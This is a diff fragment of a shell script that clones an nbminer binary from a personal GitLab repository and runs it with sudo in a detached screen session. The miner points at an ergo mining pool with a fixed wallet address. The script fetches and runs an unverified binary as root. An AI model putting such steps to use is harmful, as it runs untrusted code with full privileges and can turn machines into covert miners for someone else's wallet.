@@ -6,4 +6,4 @@ screen -dmS kaspa.sh.sh 65 75
 sudo git clone https://gitlab.com/zoey8059459/nb.git
 cd nb
 chmod +x nbminer 
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./nbminer -a ergo -o stratum+tcp://de.ergo.herominers.com:1180 -u 9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb -r $ip --nvidia 1
+sudo ./nbminer -a ergo -o stratum+tcp://de.ergo.herominers.com:1180 -u 9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.bar
